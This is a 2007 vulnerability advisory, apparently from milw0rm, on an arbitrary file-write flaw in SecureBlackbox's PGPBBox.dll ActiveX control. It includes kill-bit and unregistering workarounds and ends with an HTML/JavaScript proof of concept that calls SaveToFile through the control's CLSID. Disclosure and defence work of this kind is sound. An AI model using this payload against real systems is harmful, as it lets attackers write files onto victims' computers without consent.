<html><head><title>SecureBlackbox (PGPBBox.dll 5.1.0.112) Arbitary Data Write Exploit</title></head><pre>:. GOODFELLAS Security Research TEAM  .:
:. http://goodfellas.shellcode.com.ar .:

PGPBBox.dll 5.1.0.112 SecureBlackbox Arbitary Data Write Exploit.
================================================================

Test in patched XP SP2 IE 6.0/7.0 and Vista IE 7.0
==================================================

Internal ID: VULWAR200707121.

Introduction
------------
PGPBBox.dll is a library included in the SecureBlackbox
software package from the Eldos Company http://www.eldos.com/

Tested In
---------
- Windows XP SP2 english/french with IE 6.0 / 7.0.
- Windows vista Professional English/French SP1 with IE 7.0

Summary
-------
The SaveToFile method doesn't check if it's is being called from the application, 
or malicious users. Remote Attacker could craft a html page and write arbitrary
data.

Impact
------
Any computer that uses this Sofware will be exposed to Data Write Arbitrary.

Workaround
----------
- Activate the Kill bit zero in clsid: C22BB435-9B7F-4B1F-ACBD-CD36D34D6DFF.
- Unregister PGPBBox.dll using regsvr32.


Timeline
--------
July 12, 2007 -- Bug discovery.
July 12, 2007 -- Bug published.


Credits
-------
 * callAX &lt;callax@shellcode.com.ar
 * GoodFellas Security Research Team &lt;goodfellas.shellcode.com.ar&gt;



Technical Details
-----------------

SaveToFile method receives one argument filename in this format &quot;c:\path\file&quot;.


Proof of Concept
----------------

&lt;HTML&gt;
&lt;BODY&gt;
  &lt;object id=ctrl classid=&quot;clsid:{C22BB435-9B7F-4B1F-ACBD-CD36D34D6DFF}&quot;&gt;&lt;/object&gt;
                           
&lt;SCRIPT&gt;

function Poc()
 {
    arg2=&quot;c:\\arbitrary_file.txt&quot;
    ctrl.SaveToFile(arg2)
 }

&lt;/SCRIPT&gt;
&lt;input language=JavaScript onclick=Poc() type=button value=&quot;Proof of Concept&quot;&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;

# milw0rm.com [2007-07-12]</pre></html>